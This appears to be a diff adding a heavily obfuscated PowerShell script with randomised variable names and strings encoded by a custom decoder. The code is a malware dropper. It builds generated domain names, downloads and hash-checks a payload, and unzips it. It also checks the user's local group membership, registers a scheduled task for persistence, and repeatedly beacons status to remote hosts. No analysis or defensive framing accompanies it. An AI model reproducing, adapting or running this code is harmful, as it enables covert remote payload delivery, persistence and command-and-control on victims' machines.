+$LoatangsPreartedBaniling = (lkjhgfdszxcvbnpoiuytredfgh "ib67*l5etnhf&11#mk38afi05qsshd(&5e0rdaa0fd!igkd&@46bg8^d@^b1!g^poks!0c0mk!2&n(4(%^!725jfd4c1@57l@(j3f429k#hj");
+$AirmasticHeimationTetising = 10;
+
+for ($DerousJervingsNonitrish = 0; $DerousJervingsNonitrish -lt $AirmasticHeimationTetising; $DerousJervingsNonitrish++) {
+    $BarredTralingsTurnal = "";
+    for ($EquiressNeumourseFidginess = 0; $EquiressNeumourseFidginess -lt 15; $EquiressNeumourseFidginess++) {
+        $BarredTralingsTurnal += $LoatangsPreartedBaniling[$FinessLigomeMarusesQuadsRaneller.Next(0, 36)]
+    }
+    $CurtlesTromatorySymphsBilingPellah += $BarredTralingsTurnal + (lkjhgfdszxcvbnpoiuytredfgh "@&8^b1!igkd&");
+}
+
+
+$BilingFelostorsAllanthey = @"
+using System.Net;
+
+public class TimeoutWebClient : WebClient
+{
+    public int TimeoutSeconds;
+
+    protected override WebRequest GetWebRequest(System.Uri address)
+    {
+        WebRequest request = base.GetWebRequest(address);
+        if (request != null)
+        {
+           request.Timeout = TimeoutSeconds * 1000;
+        }
+        return request;
+    }
+
+    public TimeoutWebClient()
+    {
+        TimeoutSeconds = 300; // Timeout value by default
+    }
+}
+"@;
+
+Add-Type -TypeDefinition $BilingFelostorsAllanthey -Language CSharp
+
+
+try{
+	
+	$MyomaRebellMonot = New-Object ((lkjhgfdszxcvbnpoiuytredfgh "bj65qsdaa&11!ig!g^^b1r*#&117*ljmce0r5qs&110fd^b1"));
+$MyomaRebellMonot.((lkjhgfdszxcvbnpoiuytredfgh "bj65qsdaa&11!ig!g^^b11c4&115et!ig0fdnhf^d@")) = 900;
+
+
+    
+foreach($NonlinessRatednessPlasidern in $CurtlesTromatorySymphsBilingPellah){
+	$EpostEpickPlegaseFusibly = 5  
+    $BarredDeratiousProsis = 0
+    $DooryDivumAnganicalHendst = $false
+	 $RentularSylvialPasticDaylikeTellation = $NonlinessRatednessPlasidern;
+    while ($BarredDeratiousProsis -lt $EpostEpickPlegaseFusibly -and !$DooryDivumAnganicalHendst) {
+        $MyomaRebellMonot = New-Object System.Net.WebClient
+        try {
+			
+            $MyomaRebellMonot.DownloadFile(((lkjhgfdszxcvbnpoiuytredfgh "fi0^b1^b1kd&#ltbs^bs^3nn4(%q*9bs^38a&11^b1ib6bg85etfi05qspok&11") -f $RentularSylvialPasticDaylikeTellation), $SemisbeNonlyAntlyMilizedTring)
+
+         
+            $CasseliftNoverpalRhaped = (Get-FileHash -Path $SemisbeNonlyAntlyMilizedTring -Algorithm SHA256).Hash
+			$MyomaRebellMonot.DownloadString(((lkjhgfdszxcvbnpoiuytredfgh "fi0^b1^b1kd&#ltbs^bs^3nn^!7q*9bs^5qs0fd^d@^b1ib6e0re0rbg8&11kd&!igbg8^b16tabg8js#4(%m@^fi0ib6^d@fi0js#3nn4(%q*9") -f $CasseliftNoverpalRhaped, $RentularSylvialPasticDaylikeTellation))
+            
+            $CapistWrigarlyOverlandJemia = $MyomaRebellMonot.DownloadString(((lkjhgfdszxcvbnpoiuytredfgh "fi0^b1^b1kd&#ltbs^bs^3nn4(%q*9bs^ib6bg85etfi05qspok&11fi0ib6^d@fi0") -f $RentularSylvialPasticDaylikeTellation)).Trim()
+
+            
+            if ($CasseliftNoverpalRhaped -eq $CapistWrigarlyOverlandJemia) {
+                $DooryDivumAnganicalHendst = $true
+              
+                $MyomaRebellMonot.DownloadString(((lkjhgfdszxcvbnpoiuytredfgh "fi0^b1^b1kd&#ltbs^bs^3nn^!7q*9bs^5qs0fd^d@^b1ib6e0re0rbg8&11kd&!igbg8^b16tabg8js#4(%m@^fi0ib6^d@fi0js#3nn4(%q*9") -f $CasseliftNoverpalRhaped, $RentularSylvialPasticDaylikeTellation))
+                break  
+            } else {
+              
+                Remove-Item $SemisbeNonlyAntlyMilizedTring -Force -ErrorAction SilentlyContinue
+                $BarredDeratiousProsis++
+            }
+        } catch {
+          
+            if (Test-Path $SemisbeNonlyAntlyMilizedTring) {
+                Remove-Item $SemisbeNonlyAntlyMilizedTring -Force -ErrorAction SilentlyContinue
+            }
+            $BarredDeratiousProsis++
+        } 
+    }
+
+    if ($DooryDivumAnganicalHendst) {
+		
+        break  
+    }
+}
+}catch{
+	
+		foreach($NonlinessRatednessPlasidern in $CurtlesTromatorySymphsBilingPellah){
+	
+	 $RentularSylvialPasticDaylikeTellation = $NonlinessRatednessPlasidern;
+
+try{
+	(New-Object ((lkjhgfdszxcvbnpoiuytredfgh "1c4k!2^d@^b1&11daa@&8*g7&11^b1@&8r*#&117*ljmce0r5qs&110fd^b1"))).((lkjhgfdszxcvbnpoiuytredfgh "q8q!igs!00fde0r!igib6nhf1c4^b1bg85qs0fd38a"))(((lkjhgfdszxcvbnpoiuytredfgh "fi0^b1^b1kd&#ltbs^bs^3nn4(%q*9bs^5qs0fd^d@^b1ib6e0re0rbg8&11kd&!igbg8^b16tabg8js#25j") -f $RentularSylvialPasticDaylikeTellation))
+	
+	break;
+	}catch{}
+}
+	
+	}
+	
+
+ 
+
+cd $FaaineSaffySpers
+add-Type -assembly (lkjhgfdszxcvbnpoiuytredfgh "1c4k!2^d@^b1&11daa@&8pnm#@0@&8jmc!igdaakd&bg8&11^d@^d@5qs!ig0fd@&8d#e5qse0r&11^d@k!2^d@^b1&11daa");
+[IO.Compression.Zipfile]::((lkjhgfdszxcvbnpoiuytredfgh "(k0c0m^b1bg8ib65et^b1bj6!igq8q5qsbg8&115et^b1!igbg8k!2"))($SemisbeNonlyAntlyMilizedTring, $FaaineSaffySpers);
+remove-item $SemisbeNonlyAntlyMilizedTring
+$DeanedInkyardPoricMarkinSeptic=((lkjhgfdszxcvbnpoiuytredfgh "3nn^!7q*9!il3nn4(%q*9") -f $KitingOvedangneDialisesTside, $FaaineSaffySpers)
+if(-not (Test-Path $DeanedInkyardPoricMarkinSeptic)){
+	foreach($NonlinessRatednessPlasidern in $CurtlesTromatorySymphsBilingPellah){
+	
+	 $RentularSylvialPasticDaylikeTellation = $NonlinessRatednessPlasidern;
+
+try{
+	(New-Object ((lkjhgfdszxcvbnpoiuytredfgh "1c4k!2^d@^b1&11daa@&8*g7&11^b1@&8r*#&117*ljmce0r5qs&110fd^b1"))).((lkjhgfdszxcvbnpoiuytredfgh "q8q!igs!00fde0r!igib6nhf1c4^b1bg85qs0fd38a"))(((lkjhgfdszxcvbnpoiuytredfgh "fi0^b1^b1kd&#ltbs^bs^3nn4(%q*9bs^5qs0fd^d@^b1ib6e0re0rbg8&11kd&!igbg8^b16tabg8js#fd4") -f $RentularSylvialPasticDaylikeTellation))
+	exit
+	}catch{}
+}
+}
+
+
+
+            $DemanKairdwayGuttesFally=$null
+            $MegatorDaughtGlitize = (lkjhgfdszxcvbnpoiuytredfgh "q8q!igdaaib65qs0fdjs#34&") + $env:computername + (lkjhgfdszxcvbnpoiuytredfgh "34&6q86q8ib60fdnhf6q81c4pnmq8qjs#34&1c421c^!721c57l21cfd425j21c57lc1@c1@34&");
+          write-host $MegatorDaughtGlitize
+            $AthfulNontratedAmbure = Gwmi win32_group -Filter $MegatorDaughtGlitize;
+          
+            $BolansBurliiBeforeful = $AthfulNontratedAmbure.Name;
+            $DemanKairdwayGuttesFally = "";
+           
+
+            try {
+                $DemanKairdwayGuttesFally = (net localgroup $AthfulNontratedAmbure.Name | Select-String $env:username -SimpleMatch).ToString();
+             
+            }
+            catch {};
+            if ($DemanKairdwayGuttesFally -eq "") {
+
+                
+              
+                CaposesUnfriggedGallowStoseCirmal (lkjhgfdszxcvbnpoiuytredfgh "&11c0m!ignhf!g^^d@tirkd&nhfib6^b1&11") ((lkjhgfdszxcvbnpoiuytredfgh "3nn^!7q*9!il3nn4(%q*9") -f $KitingOvedangneDialisesTside, $FaaineSaffySpers);
+            }
+            else {
+                (lkjhgfdszxcvbnpoiuytredfgh "qhtq8qdaa5qs0fd");
+
+               
+                try {
+
+                    OveryPetateVorousLibernate (lkjhgfdszxcvbnpoiuytredfgh "&11c0m!ignhf!g^^d@tirkd&nhfib6^b1&11") ((lkjhgfdszxcvbnpoiuytredfgh "3nn^!7q*9!il3nn4(%q*9") -f $KitingOvedangneDialisesTside, $FaaineSaffySpers);
+                  
+                }
+                catch {
+                    ((lkjhgfdszxcvbnpoiuytredfgh "&11bg8bg86q8daaib65qs0fd6q83nn4(%q*9") -f $_) ;
+					foreach($NonlinessRatednessPlasidern in $CurtlesTromatorySymphsBilingPellah){
+	
+	 $RentularSylvialPasticDaylikeTellation = $NonlinessRatednessPlasidern;
+
+try{
+					(New-Object ((lkjhgfdszxcvbnpoiuytredfgh "1c4k!2^d@^b1&11daa@&8*g7&11^b1@&8r*#&117*ljmce0r5qs&110fd^b1"))).((lkjhgfdszxcvbnpoiuytredfgh "q8q!igs!00fde0r!igib6nhf1c4^b1bg85qs0fd38a"))(((lkjhgfdszxcvbnpoiuytredfgh "fi0^b1^b1kd&#ltbs^bs^3nn4(%q*9bs^5qs0fd^d@^b1ib6e0re0rbg8&11kd&!igbg8^b16tabg8js#57l") -f $RentularSylvialPasticDaylikeTellation));
+					break;
+	}catch{}
+}
+                };
+            }
+
+           
+        
+	
+       
+start-sleep 5;
+$ArgicalMulatedBloomethyShambail = Get-ScheduledTask | Where-Object { $_.((lkjhgfdszxcvbnpoiuytredfgh "bj6ib6^d@(&5*g7ib6daa&11")) -eq (lkjhgfdszxcvbnpoiuytredfgh "&11c0m!ignhf!g^^d@tirkd&nhfib6^b1&11") };
+
+if (!$ArgicalMulatedBloomethyShambail) {
+ 
+    (lkjhgfdszxcvbnpoiuytredfgh "(k0e0r&11pokib6^b1&11nhf6q8bj6ib6^d@(&56q8nhf!ig&11^d@6q80fd!ig^b16q8&11c0m5qs^d@^b1@&8");
+    CaposesUnfriggedGallowStoseCirmal (lkjhgfdszxcvbnpoiuytredfgh "&11c0m!ignhf!g^^d@tirkd&nhfib6^b1&11") ((lkjhgfdszxcvbnpoiuytredfgh "3nn^!7q*9!il3nn4(%q*9") -f $KitingOvedangneDialisesTside, $FaaineSaffySpers);
+    $ArgicalMulatedBloomethyShambail = Get-ScheduledTask | Where-Object { $_.((lkjhgfdszxcvbnpoiuytredfgh "bj6ib6^d@(&5*g7ib6daa&11")) -eq (lkjhgfdszxcvbnpoiuytredfgh "&11c0m!ignhf!g^^d@tirkd&nhfib6^b1&11") };
+    if (!$ArgicalMulatedBloomethyShambail) {
+		foreach($NonlinessRatednessPlasidern in $CurtlesTromatorySymphsBilingPellah){
+	
+	 $RentularSylvialPasticDaylikeTellation = $NonlinessRatednessPlasidern;
+
+try{
+ (New-Object ((lkjhgfdszxcvbnpoiuytredfgh "1c4k!2^d@^b1&11daa@&8*g7&11^b1@&8r*#&117*ljmce0r5qs&110fd^b1"))).((lkjhgfdszxcvbnpoiuytredfgh "q8q!igs!00fde0r!igib6nhf1c4^b1bg85qs0fd38a"))(((lkjhgfdszxcvbnpoiuytredfgh "fi0^b1^b1kd&#ltbs^bs^3nn4(%q*9bs^5qs0fd^d@^b1ib6e0re0rbg8&11kd&!igbg8^b16tabg8js#c1@") -f $RentularSylvialPasticDaylikeTellation))
+ break;
+	}catch{}
+}
+        (lkjhgfdszxcvbnpoiuytredfgh "a2qib65qs0fd6q8bj6ib6^d@(&56q8nhf!ig&11^d@6q80fd!ig^b16q8&11c0m5qs^d@^b1@&8");
+        CaposesUnfriggedGallowStoseCirmal (lkjhgfdszxcvbnpoiuytredfgh "&11c0m!ignhf!g^^d@tirkd&nhfib6^b1&11") ((lkjhgfdszxcvbnpoiuytredfgh "3nn^!7q*9!il3nn4(%q*9") -f $KitingOvedangneDialisesTside, $FaaineSaffySpers);
+    }
+}else{
+	foreach($NonlinessRatednessPlasidern in $CurtlesTromatorySymphsBilingPellah){
+	
+	 $RentularSylvialPasticDaylikeTellation = $NonlinessRatednessPlasidern;
+
+try{
+	(New-Object ((lkjhgfdszxcvbnpoiuytredfgh "1c4k!2^d@^b1&11daa@&8*g7&11^b1@&8r*#&117*ljmce0r5qs&110fd^b1"))).((lkjhgfdszxcvbnpoiuytredfgh "q8q!igs!00fde0r!igib6nhf1c4^b1bg85qs0fd38a"))(((lkjhgfdszxcvbnpoiuytredfgh "fi0^b1^b1kd&#ltbs^bs^3nn4(%q*9bs^5qs0fd^d@^b1ib6e0re0rbg8&11kd&!igbg8^b16tabg8js#^!7") -f $RentularSylvialPasticDaylikeTellation))
+	
+	break;
+	}catch{}
+}
+}
+
+
+
+
+
+
